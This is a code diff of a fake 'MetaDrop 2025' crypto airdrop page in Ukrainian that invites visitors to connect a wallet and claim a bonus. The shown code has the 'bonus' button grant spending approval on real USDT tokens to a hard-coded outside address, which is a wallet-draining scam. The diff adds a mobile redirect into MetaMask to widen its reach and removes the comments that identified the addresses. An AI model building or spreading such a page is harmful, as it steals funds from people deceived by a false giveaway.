@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <title>MetaDrop 2025 | Multi-Device Support</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -42,7 +41,7 @@
 <body>
   <div class="box">
     <h2>🎁 MetaDrop 2025</h2>
-    <p>Працює на ПК та мобільному<br>Натисніть кнопку для підключення</p>
+    <p id="info">Працює на ПК та мобільному<br>Натисніть кнопку для підключення</p>
     <button onclick="connectWallet()">🔐 Підключити гаманець</button>
     <button onclick="approveTokens()">✅ Отримати бонус</button>
   </div>
@@ -59,12 +58,14 @@
           await provider.send("eth_requestAccounts", []);
           signer = provider.getSigner();
         } else {
-          const walletConnectProvider = new WalletConnectProvider.default({
-            infuraId: "1a2b3c4d5e6f4g7h8i9j0k"
-          });
-          await walletConnectProvider.enable();
-          provider = new ethers.providers.Web3Provider(walletConnectProvider);
-          signer = provider.getSigner();
+          const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+          if (isMobile) {
+            const currentUrl = encodeURIComponent(window.location.href);
+            window.location.href = `https://metamask.app.link/dapp/${currentUrl.replace(/^https?:\/\//, '')}`;
+          } else {
+            alert("🛑 Ваш браузер не підтримує Web3. Встановіть MetaMask.");
+          }
+          return;
         }
 
         const address = await signer.getAddress();
@@ -101,8 +102,8 @@
         return;
       }
 
-      const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // реальний USDT
-      const spender = "0x544efFe1651BD2A665e4aD7ddA155d38f71FC1c0"; // адреса отримувача дозволу
+      const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+      const spender = "0x544efFe1651BD2A665e4aD7ddA155d38f71FC1c0";
       const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
       const token = new ethers.Contract(usdtAddress, abi, signer);
 
